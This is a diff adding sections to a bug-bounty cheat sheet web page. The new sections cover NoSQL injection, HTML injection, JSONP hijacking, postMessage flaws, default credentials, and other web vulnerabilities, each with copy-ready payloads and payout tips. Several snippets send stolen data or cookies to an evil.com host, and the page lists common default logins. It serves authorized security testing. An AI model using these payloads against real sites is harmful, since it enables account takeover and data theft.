@@ -116,13 +116,14 @@
   <div class="sidebar">
     <div class="section-title">Critical / High</div>
     <a href="#sqli"><span class="dot dot-critical"></span>SQL Injection</a>
+    <a href="#nosql-injection"><span class="dot dot-critical"></span>NoSQL Injection</a>
     <a href="#xss"><span class="dot dot-critical"></span>XSS (Cross-Site Scripting)</a>
     <a href="#ssrf"><span class="dot dot-critical"></span>SSRF</a>
     <a href="#rce"><span class="dot dot-critical"></span>RCE</a>
-    <a href="#idor"><span class="dot dot-high"></span>IDOR</a>
-    <a href="#auth-bypass"><span class="dot dot-high"></span>Auth Bypass</a>
     <a href="#request-smuggling"><span class="dot dot-critical"></span>Request Smuggling</a>
     <a href="#deserialization"><span class="dot dot-critical"></span>Insecure Deserialization</a>
+    <a href="#idor"><span class="dot dot-high"></span>IDOR</a>
+    <a href="#auth-bypass"><span class="dot dot-high"></span>Auth Bypass</a>
     <a href="#race-conditions"><span class="dot dot-high"></span>Race Conditions</a>
     <a href="#jwt-attacks"><span class="dot dot-high"></span>JWT Attacks</a>
     <a href="#oauth"><span class="dot dot-high"></span>OAuth Vulns</a>
@@ -130,9 +131,27 @@
     <a href="#api-security"><span class="dot dot-high"></span>API Security</a>
     <a href="#file-upload"><span class="dot dot-high"></span>File Upload Vulns</a>
     <a href="#crlf"><span class="dot dot-high"></span>CRLF Injection</a>
-    <a href="#graphql"><span class="dot dot-high"></span>GraphQL Vulns</a>
     <a href="#subdomain-takeover"><span class="dot dot-high"></span>Subdomain Takeover</a>
     <a href="#dns-rebinding"><span class="dot dot-high"></span>DNS Rebinding</a>
+    <a href="#graphql"><span class="dot dot-high"></span>GraphQL Vulns</a>
+    <a href="#host-header"><span class="dot dot-high"></span>Host Header Injection</a>
+    <a href="#postmessage"><span class="dot dot-high"></span>postMessage Vulns</a>
+    <a href="#default-credentials"><span class="dot dot-high"></span>Default Credentials</a>
+    <a href="#imap-smtp"><span class="dot dot-high"></span>IMAP/SMTP Injection</a>
+    <a href="#aws-s3"><span class="dot dot-high"></span>AWS S3 Misconfig</a>
+    <a href="#aws-iam"><span class="dot dot-critical"></span>AWS IAM Escalation</a>
+    <a href="#azure-blob"><span class="dot dot-high"></span>Azure Blob Storage</a>
+    <a href="#azure-rbac"><span class="dot dot-high"></span>Azure RBAC Bypass</a>
+    <a href="#azure-keyvault"><span class="dot dot-high"></span>Azure Key Vault</a>
+    <a href="#azure-ad"><span class="dot dot-critical"></span>Azure AD Priv Escalation</a>
+    <a href="#gcp-iam"><span class="dot dot-high"></span>GCP IAM Misconfig</a>
+    <a href="#gcp-bucket"><span class="dot dot-high"></span>GCP Bucket Enumeration</a>
+    <a href="#gcp-ssh"><span class="dot dot-high"></span>GCP Project-Wide SSH</a>
+    <a href="#k8s"><span class="dot dot-critical"></span>Kubernetes Security</a>
+    <a href="#docker"><span class="dot dot-high"></span>Docker Security</a>
+    <a href="#aws-ecr"><span class="dot dot-high"></span>AWS ECR Exposure</a>
+    <a href="#aws-cognito"><span class="dot dot-high"></span>AWS Cognito Security</a>
+    <a href="#aws-cloudformation"><span class="dot dot-high"></span>AWS CloudFormation</a>
 
     <div class="section-title">Medium</div>
     <a href="#csrf"><span class="dot dot-medium"></span>CSRF</a>
@@ -146,16 +165,40 @@
     <a href="#ssi"><span class="dot dot-medium"></span>SSI Injection</a>
     <a href="#ldap-injection"><span class="dot dot-medium"></span>LDAP Injection</a>
     <a href="#xpath-injection"><span class="dot dot-medium"></span>XPath Injection</a>
-    <a href="#host-header"><span class="dot dot-medium"></span>Host Header Injection</a>
     <a href="#cache-poisoning"><span class="dot dot-medium"></span>Web Cache Poisoning</a>
     <a href="#cache-deception"><span class="dot dot-medium"></span>Web Cache Deception</a>
-    <a href="#websocket"><span class="dot dot-medium"></span>WebSocket Vulns</a>
     <a href="#password-reset"><span class="dot dot-medium"></span>Password Reset Vulns</a>
     <a href="#session-fixation"><span class="dot dot-medium"></span>Session Fixation</a>
     <a href="#request-splitting"><span class="dot dot-medium"></span>Request Splitting</a>
     <a href="#unicode-norm"><span class="dot dot-medium"></span>Unicode Normalization</a>
     <a href="#http2"><span class="dot dot-medium"></span>HTTP/2 Vulns</a>
     <a href="#cors-preflight"><span class="dot dot-medium"></span>CORS Preflight Bypass</a>
+    <a href="#html-injection"><span class="dot dot-medium"></span>HTML Injection</a>
+    <a href="#parameter-pollution"><span class="dot dot-medium"></span>Parameter Pollution</a>
+    <a href="#jsonp-hijacking"><span class="dot dot-medium"></span>JSONP Hijacking</a>
+    <a href="#insecure-randomness"><span class="dot dot-medium"></span>Insecure Randomness</a>
+    <a href="#directory-listing"><span class="dot dot-medium"></span>Directory Listing</a>
+    <a href="#cleartext-transmission"><span class="dot dot-medium"></span>Cleartext Transmission</a>
+    <a href="#source-code-disclosure"><span class="dot dot-medium"></span>Source Code Disclosure</a>
+    <a href="#subdomain-cookie"><span class="dot dot-medium"></span>Subdomain Cookie Abuse</a>
+    <a href="#window-name"><span class="dot dot-medium"></span>Window.name Injection</a>
+    <a href="#content-injection"><span class="dot dot-medium"></span>Content Injection</a>
+    <a href="#sri-bypass"><span class="dot dot-medium"></span>SRI Bypass</a>
+    <a href="#login-csrf"><span class="dot dot-medium"></span>Login CSRF</a>
+    <a href="#session-url"><span class="dot dot-medium"></span>Session Token in URL</a>
+    <a href="#service-worker"><span class="dot dot-medium"></span>Service Worker Abuse</a>
+    <a href="#dns-zone-transfer"><span class="dot dot-medium"></span>DNS Zone Transfer</a>
+    <a href="#email-injection"><span class="dot dot-medium"></span>Email Injection</a>
+    <a href="#host-header-race"><span class="dot dot-medium"></span>Host Header Race</a>
+    <a href="#websocket-cross-origin"><span class="dot dot-medium"></span>WebSocket Cross-Origin</a>
+    <a href="#html5-security"><span class="dot dot-medium"></span>HTML5 Security</a>
+    <a href="#regex-dos"><span class="dot dot-medium"></span>Regex DoS (ReDoS)</a>
+    <a href="#aws-lambda"><span class="dot dot-medium"></span>AWS Lambda Security</a>
+    <a href="#serverless"><span class="dot dot-medium"></span>Serverless Security</a>
+    <a href="#api-gateway"><span class="dot dot-medium"></span>API Gateway Misconfig</a>
+    <a href="#aws-waf"><span class="dot dot-medium"></span>AWS WAF Bypass</a>
+    <a href="#azure-app-service"><span class="dot dot-medium"></span>Azure App Service</a>
+    <a href="#gcp-org-bypass"><span class="dot dot-medium"></span>GCP Org Policy Bypass</a>
 
     <div class="section-title">Low / Info</div>
     <a href="#info-disclosure"><span class="dot dot-low"></span>Info Disclosure</a>
@@ -164,26 +207,18 @@
     <a href="#mime-sniffing"><span class="dot dot-low"></span>MIME Sniffing</a>
     <a href="#captcha"><span class="dot dot-low"></span>Insecure CAPTCHA</a>
     <a href="#webrtc"><span class="dot dot-info"></span>WebRTC IP Leak</a>
+    <a href="#cookie-flags"><span class="dot dot-low"></span>Cookie Security Flags</a>
+    <a href="#hsts-bypass"><span class="dot dot-low"></span>HSTS Bypass</a>
+    <a href="#feature-policy"><span class="dot dot-low"></span>Feature Policy Abuse</a>
+    <a href="#local-storage"><span class="dot dot-low"></span>Local Storage Data</a>
+    <a href="#mixed-content"><span class="dot dot-low"></span>Mixed Content</a>
+    <a href="#css-injection"><span class="dot dot-low"></span>CSS Injection</a>
+    <a href="#cloudtrail"><span class="dot dot-info"></span>CloudTrail Evasion</a>
 
     <div class="section-title">Tools & Setup</div>
     <a href="#recon"><span class="dot dot-info"></span>Recon Commands</a>
     <a href="#tools"><span class="dot dot-info"></span>Tool Install</a>
     <a href="#wordlists"><span class="dot dot-info"></span>Wordlists</a>
-
-    <div class="section-title">Cloud Security</div>
-    <a href="#aws-s3"><span class="dot dot-high"></span>AWS S3 Misconfig</a>
-    <a href="#aws-iam"><span class="dot dot-critical"></span>AWS IAM Escalation</a>
-    <a href="#aws-lambda"><span class="dot dot-medium"></span>AWS Lambda Security</a>
-    <a href="#azure-blob"><span class="dot dot-high"></span>Azure Blob Storage</a>
-    <a href="#azure-rbac"><span class="dot dot-high"></span>Azure RBAC Bypass</a>
-    <a href="#gcp-iam"><span class="dot dot-high"></span>GCP IAM Misconfig</a>
-    <a href="#gcp-bucket"><span class="dot dot-high"></span>GCP Bucket Enumeration</a>
-    <a href="#k8s"><span class="dot dot-critical"></span>Kubernetes Security</a>
-    <a href="#docker"><span class="dot dot-high"></span>Docker Security</a>
-    <a href="#cloud-metadata"><span class="dot dot-critical"></span>Cloud Metadata Abuse</a>
-    <a href="#serverless"><span class="dot dot-medium"></span>Serverless Security</a>
-    <a href="#api-gateway"><span class="dot dot-medium"></span>API Gateway Misconfig</a>
-    <a href="#cloudtrail"><span class="dot dot-info"></span>CloudTrail Evasion</a>
 
     <div class="section-title">Workspace</div>
     <a href="#scratchpad"><span class="dot dot-info"></span>Scratchpad</a>
@@ -2259,10 +2294,1269 @@ GET, POST with standard headers only
         </div>
       </div>
 
-      <!-- ==================== CLOUD SECURITY SECTION ==================== -->
 
-      <div style="margin: 30px 0 20px; padding: 8px 0; border-top: 2px solid var(--accent);">
-        <h2 style="color: var(--accent); font-size: 18px;">☁️ Cloud Security</h2>
+      <!-- NOSQL INJECTION -->
+      <div class="card" id="nosql-injection">
+        <div class="card-header" onclick="toggleCard(this)">
+          <span class="severity sev-critical">Critical</span>
+          <h3>🗾 NoSQL Injection</h3>
+          <span class="tag pay">$$$: High Payout</span>
+          <span class="toggle">▶</span>
+        </div>
+        <div class="card-body">
+          <p><strong>What:</strong> Injecting MongoDB/CouchDB operators ($gt, $ne, $regex, $where) into JSON queries to bypass authentication or extract data.</p>
+
+          <div class="step"><div class="step-num">1</div><div class="step-content"><strong>Basic detection:</strong></div></div>
+          <div class="code-block">
+            <div class="code-header"><span>NoSQL Detection</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code># JSON injection
+{"username": "admin", "password": {"$ne": ""}}
+{"username": {"$ne": ""}, "password": {"$ne": ""}}
+
+# String operator
+{"username": "admin", "password": {"$regex": ".*"}}
+
+# Array injection
+{"username": "admin", "password": {"$in": ["password", "admin", "123456"]}}
+
+# URL parameter injection
+?username=admin&amp;password[$ne]=
+?username[$ne]=&amp;password[$ne]=</code></pre>
+          </div>
+
+          <div class="step"><div class="step-num">2</div><div class="step-content"><strong>$where JavaScript injection:</strong></div></div>
+          <div class="code-block">
+            <div class="code-header"><span>$where Injection</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code># If $where is allowed:
+{"$where": "this.password.length > 0"}
+{"$where": "sleep(5000)"}  # Time-based
+
+# Extract data via $regex
+{"username": {"$regex": "^a"}}
+{"username": {"$regex": "^ad"}}
+# Keep adding chars until you've exfiltrated the username</code></pre>
+          </div>
+
+          <div class="note danger">⚠️ <strong>Bounty tip:</strong> Authentication bypass via NoSQL injection is always Critical. Time-based blind NoSQL injection on authenticated endpoints pays well.</div>
+        </div>
+      </div>
+
+      <!-- HTML INJECTION -->
+      <div class="card" id="html-injection">
+        <div class="card-header" onclick="toggleCard(this)">
+          <span class="severity sev-medium">Medium</span>
+          <h3>📝 HTML Injection</h3>
+          <span class="tag pay">$$: Medium Payout</span>
+          <span class="toggle">▶</span>
+        </div>
+        <div class="card-body">
+          <p><strong>What:</strong> Injecting HTML tags into user input that gets rendered by the browser, leading to UI manipulation, defacement, or stored HTML injection.</p>
+
+          <div class="step"><div class="step-num">1</div><div class="step-content"><strong>Basic HTML injection payloads:</strong></div></div>
+          <div class="code-block">
+            <div class="code-header"><span>HTML Injection</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code># Basic tags
+&lt;h1&gt;Injected Header&lt;/h1&gt;
+&lt;div style="background:red;color:white;padding:20px"&gt;Defaced&lt;/div&gt;
+&lt;img src=x onerror="alert(1)"&gt;
+
+# Forms for phishing
+&lt;form action="https://evil.com"&gt;&lt;input type="text" name="cred"&gt;&lt;/form&gt;
+
+# Hidden content
+&lt;details&gt;&lt;summary&gt;Click me&lt;/summary&gt;Hidden content&lt;/details&gt;
+&lt;marquee&gt;Defaced!&lt;/marquee&gt;
+
+# CSS injection via HTML
+&lt;link rel="stylesheet" href="https://evil.com/style.css"&gt;
+&lt;style&gt;body{background:red!important}&lt;/style&gt;</code></pre>
+          </div>
+
+          <div class="note warn">💡 <strong>Bounty tip:</strong> Stored HTML injection that affects other users is Medium. HTML injection in email templates (reset password, notifications) can be High.</div>
+        </div>
+      </div>
+
+      <!-- PARAMETER POLLUTION / HPP -->
+      <div class="card" id="parameter-pollution">
+        <div class="card-header" onclick="toggleCard(this)">
+          <span class="severity sev-medium">Medium</span>
+          <h3>🔄 Parameter Pollution (HPP)</h3>
+          <span class="tag pay">$$: Medium Payout</span>
+          <span class="toggle">▶</span>
+        </div>
+        <div class="card-body">
+          <p><strong>What:</strong> Injecting duplicate parameters to bypass security controls, cause logic errors, or pollute backend query processing.</p>
+
+          <div class="step"><div class="step-num">1</div><div class="step-content"><strong>HPP techniques:</strong></div></div>
+          <div class="code-block">
+            <div class="code-header"><span>HPP Payloads</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code># Duplicate parameters
+?id=1&amp;id=2
+# Backend may use last value (2) while frontend validates first (1)
+
+# Server-side vs client-side parameter confusion
+?redirect=https://evil.com&amp;redirect=https://safe.com
+# Client validates last, server uses first
+
+# Case sensitivity
+?ID=1&amp;id=2
+
+# Parameter pollution in headers
+X-Forwarded-For: 127.0.0.1, 10.0.0.1
+
+# JSON body pollution
+{"id": 1, "role": "user", "id": 999}</code></pre>
+          </div>
+
+          <div class="note warn">💡 <strong>Bounty tip:</strong> HPP that leads to auth bypass or privilege escalation upgrades severity to High.</div>
+        </div>
+      </div>
+
+      <!-- JSONP HIJACKING -->
+      <div class="card" id="jsonp-hijacking">
+        <div class="card-header" onclick="toggleCard(this)">
+          <span class="severity sev-medium">Medium</span>
+          <h3>🔗 JSONP Hijacking</h3>
+          <span class="tag pay">$$: Medium Payout</span>
+          <span class="toggle">▶</span>
+        </div>
+        <div class="card-body">
+          <p><strong>What:</strong> Stealing sensitive data from JSONP endpoints by overriding the callback function to exfiltrate data cross-origin.</p>
+
+          <div class="step"><div class="step-num">1</div><div class="step-content"><strong>JSONP hijacking technique:</strong></div></div>
+          <div class="code-block">
+            <div class="code-header"><span>JSONP Hijack</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code># Override the callback function
+&lt;script&gt;
+function callback(data) {
+  fetch('https://evil.com/steal?data=' + JSON.stringify(data));
+}
+&lt;/script&gt;
+&lt;script src="https://target.com/api?callback=callback"&gt;&lt;/script&gt;
+
+# Discover JSONP endpoints
+# Look for ?callback=, ?jsonp=, ?cb= parameters
+# Test with: ?callback=test -&gt; response: test({...})
+
+# CSRF token bypass
+&lt;script&gt;
+function stealCSRF(data) {
+  fetch('https://evil.com/steal?token=' + data.csrf_token);
+}
+&lt;/script&gt;</code></pre>
+          </div>
+
+          <div class="note warn">💡 <strong>Bounty tip:</strong> JSONP endpoint exposing user data (email, profile) without CORS = Medium. If it exposes tokens or sensitive data = High.</div>
+        </div>
+      </div>
+
+      <!-- POSTMESSAGE VULNERABILITIES -->
+      <div class="card" id="postmessage">
+        <div class="card-header" onclick="toggleCard(this)">
+          <span class="severity sev-high">High</span>
+          <h3>📨 postMessage Vulnerabilities</h3>
+          <span class="tag pay">$$$: High Payout</span>
+          <span class="toggle">▶</span>
+        </div>
+        <div class="card-body">
+          <p><strong>What:</strong> Missing origin validation in postMessage handlers allowing cross-origin messages to trigger sensitive actions.</p>
+
+          <div class="step"><div class="step-num">1</div><div class="step-content"><strong>Detect postMessage listeners:</strong></div></div>
+          <div class="code-block">
+            <div class="code-header"><span>postMessage Detection</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code># In console of target page:
+window.addEventListener('message', function(e) {
+  console.log('Origin:', e.origin);
+  console.log('Data:', e.data);
+  console.log('Source:', e.source);
+});
+
+# Send test message from attacker page:
+&lt;iframe src="https://target.com/page"&gt;&lt;/iframe&gt;
+&lt;script&gt;
+window.onload = function() {
+  var iframe = document.querySelector('iframe');
+  iframe.contentWindow.postMessage('test', '*');
+};
+&lt;/script&gt;</code></pre>
+          </div>
+
+          <div class="step"><div class="step-num">2</div><div class="step-content"><strong>Exploitation:</strong></div></div>
+          <div class="code-block">
+            <div class="code-header"><span>Exploit</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code># If no origin check:
+&lt;script&gt;
+// Message handler receives any postMessage
+window.addEventListener('message', function(e) {
+  // Exfiltrate received data
+  fetch('https://evil.com/steal?data=' + JSON.stringify(e.data));
+});
+&lt;/script&gt;
+
+# If checking event.origin but flawed:
+# Try null origin, data: URI, or subdomain</code></pre>
+          </div>
+
+          <div class="note danger">⚠️ <strong>Bounty tip:</strong> postMessage XSS or CSRF leading to account takeover = High/Critical. Always demonstrate the full attack chain with a proof-of-concept.</div>
+        </div>
+      </div>
+
+      <!-- INSECURE RANDOMNESS -->
+      <div class="card" id="insecure-randomness">
+        <div class="card-header" onclick="toggleCard(this)">
+          <span class="severity sev-medium">Medium</span>
+          <h3>🎲 Insecure Randomness</h3>
+          <span class="tag pay">$$: Medium Payout</span>
+          <span class="toggle">▶</span>
+        </div>
+        <div class="card-body">
+          <p><strong>What:</strong> Predictable tokens, session IDs, or CSRF tokens generated using weak PRNG (Math.random(), time-based seeds).</p>
+
+          <div class="step"><div class="step-num">1</div><div class="step-content"><strong>Detect predictable tokens:</strong></div></div>
+          <div class="code-block">
+            <div class="code-header"><span>Randomness Analysis</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code># Generate multiple tokens and analyze pattern
+# If tokens are time-based, predict the seed
+# Math.random() produces values in [0,1)
+
+# Test patterns:
+# - Are tokens sequential? (token, token+1, token+2)
+# - Are they timestamp-based? (decode as epoch)
+# - Do they use XOR with predictable values?
+
+# Client-side token generation
+# Look in JS source for Math.random() usage
+# Particularly in password reset, invitation, or 2FA codes</code></pre>
+          </div>
+
+          <div class="note warn">💡 <strong>Bounty tip:</strong> Predictable password reset tokens = High. Predictable session IDs = Critical. Predictable API keys = High.</div>
+        </div>
+      </div>
+
+      <!-- DEFAULT CREDENTIALS -->
+      <div class="card" id="default-credentials">
+        <div class="card-header" onclick="toggleCard(this)">
+          <span class="severity sev-high">High</span>
+          <h3>🔑 Default Credentials</h3>
+          <span class="tag pay">$$$: High Payout</span>
+          <span class="toggle">▶</span>
+        </div>
+        <div class="card-body">
+          <p><strong>What:</strong> Factory default usernames/passwords on admin panels, databases, or services that were never changed after deployment.</p>
+
+          <div class="step"><div class="step-num">1</div><div class="step-content"><strong>Common default credentials:</strong></div></div>
+          <div class="code-block">
+            <div class="code-header"><span>Default Creds</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code># Common defaults
+admin:admin, admin:password, admin:123456
+root:root, root:toor, root:password
+test:test, guest:guest, user:user
+
+# Common services
+PostgreSQL: postgres:postgres
+MongoDB: admin:admin (no auth by default)
+Redis: no password by default
+Kafka: no auth by default
+Jenkins: admin:admin (first setup)
+
+# Admin panels
+phpMyAdmin: root:root
+Adminer: root:root
+Webmin: root:password</code></pre>
+          </div>
+
+          <div class="note danger">⚠️ <strong>Bounty tip:</strong> Default credentials on production admin panels = High. Default database credentials = Critical. Always demonstrate access and what's possible.</div>
+        </div>
+      </div>
+
+      <!-- DIRECTORY LISTING -->
+      <div class="card" id="directory-listing">
+        <div class="card-header" onclick="toggleCard(this)">
+          <span class="severity sev-medium">Medium</span>
+          <h3>📁 Directory Listing</h3>
+          <span class="tag pay">$$: Medium Payout</span>
+          <span class="toggle">▶</span>
+        </div>
+        <div class="card-body">
+          <p><strong>What:</strong> Exposed directory contents on web servers revealing backup files, source code, configuration files, or sensitive data.</p>
+
+          <div class="step"><div class="step-num">1</div><div class="step-content"><strong>Finding directory listings:</strong></div></div>
+          <div class="code-block">
+            <div class="code-header"><span>Directory Listing</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code># Common paths with directory listing
+/admin/, /backup/, /config/, /debug/, /logs/
+/uploads/, /temp/, /old/, /test/, /dev/
+/.git/, /.svn/, /.env
+
+# Test by adding trailing slash
+https://target.com/admin
+https://target.com/admin/
+
+# Look for "Index of" in response
+curl -s https://target.com/backup/ | grep "Index of"</code></pre>
+          </div>
+
+          <div class="note warn">💡 <strong>Bounty tip:</strong> Directory listing exposing sensitive files (backups, configs) = High. Directory listing on public assets = Low.</div>
+        </div>
+      </div>
+
+      <!-- COOKIE SECURITY FLAGS -->
+      <div class="card" id="cookie-flags">
+        <div class="card-header" onclick="toggleCard(this)">
+          <span class="severity sev-low">Low</span>
+          <h3>🍪 Cookie Security Flags</h3>
+          <span class="toggle">▶</span>
+        </div>
+        <div class="card-body">
+          <p><strong>What:</strong> Missing Secure, HttpOnly, or SameSite flags on session cookies leading to theft via XSS or CSRF attacks.</p>
+
+          <div class="step"><div class="step-num">1</div><div class="step-content"><strong>Check cookie flags:</strong></div></div>
+          <div class="code-block">
+            <div class="code-header"><span>Cookie Analysis</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code># Check Set-Cookie headers
+curl -I https://target.com/ | grep -i "set-cookie"
+
+# Browser DevTools -&gt; Application -&gt; Cookies
+# Check: Secure, HttpOnly, SameSite attributes
+
+# Missing flags:
+# No Secure -&gt; cookie sent over HTTP (MITM theft)
+# No HttpOnly -&gt; cookie accessible via JavaScript (XSS theft)
+# No SameSite -&gt; cookie sent with cross-site requests (CSRF)</code></pre>
+          </div>
+
+          <div class="note">💡 Missing cookie flags are Low severity but contribute to attack chains. Report them as part of a larger finding (e.g., XSS + missing HttpOnly = session hijack).</div>
+        </div>
+      </div>
+
+      <!-- CLEARTEXT TRANSMISSION -->
+      <div class="card" id="cleartext-transmission">
+        <div class="card-header" onclick="toggleCard(this)">
+          <span class="severity sev-medium">Medium</span>
+          <h3>🔓 Cleartext Transmission</h3>
+          <span class="tag pay">$$: Medium Payout</span>
+          <span class="toggle">▶</span>
+        </div>
+        <div class="card-body">
+          <p><strong>What:</strong> Sensitive data transmitted over HTTP instead of HTTPS, or mixed content pages loading HTTP resources.</p>
+
+          <div class="step"><div class="step-num">1</div><div class="step-content"><strong>Detection:</strong></div></div>
+          <div class="code-block">
+            <div class="code-header"><span>HTTP Detection</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code># Check if site works over HTTP
+curl -I http://target.com/
+
+# Check for HTTP redirects
+curl -v http://target.com/ 2&gt;&amp;1 | grep "location"
+
+# Check for mixed content
+# DevTools -&gt; Console -&gt; look for "Mixed Content" warnings
+
+# Check login forms over HTTP
+# If form action is HTTP or page loads over HTTP</code></pre>
+          </div>
+
+          <div class="note warn">💡 <strong>Bounty tip:</strong> Credentials sent over HTTP = Medium. Full site accessible over HTTP without redirect = High.</div>
+        </div>
+      </div>
+
+      <!-- SOURCE CODE DISCLOSURE -->
+      <div class="card" id="source-code-disclosure">
+        <div class="card-header" onclick="toggleCard(this)">
+          <span class="severity sev-medium">Medium</span>
+          <h3>📋 Source Code Disclosure</h3>
+          <span class="tag pay">$$: Medium Payout</span>
+          <span class="toggle">▶</span>
+        </div>
+        <div class="card-body">
+          <p><strong>What:</strong> Exposed .git repositories, .svn directories, backup files, or JavaScript source maps revealing internal code and secrets.</p>
+
+          <div class="step"><div class="step-num">1</div><div class="step-content"><strong>Check for VCS exposure:</strong></div></div>
+          <div class="code-block">
+            <div class="code-header"><span>VCS Exposure</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code># .git exposure
+curl -s https://target.com/.git/HEAD
+curl -s https://target.com/.git/config
+
+# .svn exposure
+curl -s https://target.com/.svn/entries
+curl -s https://target.com/.svn/wc.db
+
+# Backup files
+/target.com.bak, /config.php.bak
+/old/, /backup/, /temp/
+
+# JavaScript source maps
+curl -s https://target.com/app.js.map
+
+# Tool: GitHack
+python GitHack.py https://target.com/.git/</code></pre>
+          </div>
+
+          <div class="note warn">💡 <strong>Bounty tip:</strong> Git exposure with sensitive secrets in history = High. Source maps revealing internal API keys = Medium.</div>
+        </div>
+      </div>
+
+      <!-- HSTS BYPASS -->
+      <div class="card" id="hsts-bypass">
+        <div class="card-header" onclick="toggleCard(this)">
+          <span class="severity sev-low">Low</span>
+          <h3>🔒 HSTS Bypass</h3>
+          <span class="toggle">▶</span>
+        </div>
+        <div class="card-body">
+          <p><strong>What:</strong> Stripping HSTS headers or performing downgrade attacks to force HTTP connections on HSTS-protected sites.</p>
+
+          <div class="step"><div class="step-num">1</div><div class="step-content"><strong>HSTS testing:</strong></div></div>
+          <div class="code-block">
+            <div class="code-header"><span>HSTS Test</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code># Check for HSTS header
+curl -I https://target.com/ | grep -i "strict-transport"
+
+# First visit bypass (before HSTS is cached)
+# MITM on first connection
+
+# Subdomain bypass
+# If *.target.com has HSTS but sub.target.com doesn't
+
+# Port-based bypass
+https://target.com:444
+
+# Check HSTS preload list
+# https://hstspreload.org/</code></pre>
+          </div>
+
+          <div class="note">💡 HSTS bypass alone is Low severity. Combined with cookie theft or credential sniffing, it escalates to Medium.</div>
+        </div>
+      </div>
+
+      <!-- SUBDOMAIN COOKIE ABUSE -->
+      <div class="card" id="subdomain-cookie">
+        <div class="card-header" onclick="toggleCard(this)">
+          <span class="severity sev-medium">Medium</span>
+          <h3>🍪 Subdomain Cookie Abuse</h3>
+          <span class="tag pay">$$: Medium Payout</span>
+          <span class="toggle">▶</span>
+        </div>
+        <div class="card-body">
+          <p><strong>What:</strong> Cookies set on parent domain affecting all subdomains, allowing cookie poisoning or injection from compromised subdomains.</p>
+
+          <div class="step"><div class="step-num">1</div><div class="step-content"><strong>Detection:</strong></div></div>
+          <div class="code-block">
+            <div class="code-header"><span>Cookie Scope</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code># Check Set-Cookie Domain attribute
+# Cookie: session=abc123; Domain=.target.com
+# This cookie is sent to ALL subdomains
+
+# If you control a subdomain (e.g., evil.target.com):
+# 1. Set cookies for .target.com
+# 2. Poison session cookies
+# 3. Inject malicious authentication cookies
+
+# Test: Set cookie on compromised subdomain
+document.cookie = "session=attacker_token; domain=.target.com; path=/"
+
+# Subdomain takeover + cookie poisoning = account takeover</code></pre>
+          </div>
+
+          <div class="note warn">💡 <strong>Bounty tip:</strong> Subdomain takeover + cookie poisoning = Critical. Cookie injection from XSS on subdomain = High.</div>
+        </div>
+      </div>
+
+      <!-- WINDOW.NAME INJECTION -->
+      <div class="card" id="window-name">
+        <div class="card-header" onclick="toggleCard(this)">
+          <span class="severity sev-medium">Medium</span>
+          <h3>🪟 Window.name Injection</h3>
+          <span class="tag pay">$$: Medium Payout</span>
+          <span class="toggle">▶</span>
+        </div>
+        <div class="card-body">
+          <p><strong>What:</strong> Using window.name property for data transfer between frames, leading to XSS or data exfiltration across origins.</p>
+
+          <div class="step"><div class="step-num">1</div><div class="step-content"><strong>window.name exploitation:</strong></div></div>
+          <div class="code-block">
+            <div class="code-header"><span>Window.name Attack</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code># window.name persists across navigations
+# and is accessible cross-origin via window.name
+
+# Step 1: On attacker page, set window.name
+window.name = "&lt;script&gt;fetch('https://evil.com/steal?data='+document.cookie)&lt;/script&gt;";
+
+# Step 2: Redirect to target page
+location = 'https://target.com/page';
+
+# Step 3: Target page reads window.name
+# If the app uses window.name unsafely:
+eval(window.name);  # XSS!
+document.body.innerHTML = window.name;  # XSS!</code></pre>
+          </div>
+
+          <div class="note warn">💡 <strong>Bounty tip:</strong> window.name leading to XSS = High. window.name used for data exfiltration = Medium.</div>
+        </div>
+      </div>
+
+      <!-- CONTENT INJECTION -->
+      <div class="card" id="content-injection">
+        <div class="card-header" onclick="toggleCard(this)">
+          <span class="severity sev-medium">Medium</span>
+          <h3>💨 Content Injection</h3>
+          <span class="tag pay">$$: Medium Payout</span>
+          <span class="toggle">▶</span>
+        </div>
+        <div class="card-body">
+          <p><strong>What:</strong> Injecting content into pages via text injection, HTML injection, or reflected parameters that modify page content.</p>
+
+          <div class="step"><div class="step-num">1</div><div class="step-content"><strong>Content injection vectors:</strong></div></div>
+          <div class="code-block">
+            <div class="code-header"><span>Content Injection</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code># Reflected text injection
+/search?q=&lt;h1&gt;Injected&lt;/h1&gt;
+/error?msg=Injected+Content
+
+# Title/description injection
+/page?title=Injected+Title
+/meta?description=Injected+Description
+
+# Custom error pages
+/404?page=Injected
+/500?error=Injected+Error
+
+# API responses rendered as HTML
+/api/data?format=html&amp;data=Injected</code></pre>
+          </div>
+
+          <div class="note warn">💡 Content injection can be chained with other attacks. Always check if injected content can lead to XSS or social engineering.</div>
+        </div>
+      </div>
+
+      <!-- SRI BYPASS -->
+      <div class="card" id="sri-bypass">
+        <div class="card-header" onclick="toggleCard(this)">
+          <span class="severity sev-medium">Medium</span>
+          <h3>🛡️ SRI Bypass</h3>
+          <span class="tag pay">$$: Medium Payout</span>
+          <span class="toggle">▶</span>
+        </div>
+        <div class="card-body">
+          <p><strong>What:</strong> Bypassing Subresource Integrity checks by finding CDN misconfigurations, hash collisions, or unsigned resources.</p>
+
+          <div class="step"><div class="step-num">1</div><div class="step-content"><strong>SRI bypass techniques:</strong></div></div>
+          <div class="code-block">
+            <div class="code-header"><span>SRI Bypass</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+            <pre><code># Check if scripts have SRI
+# Look for integrity= attribute on script/link tags
+
+# Bypass techniques:
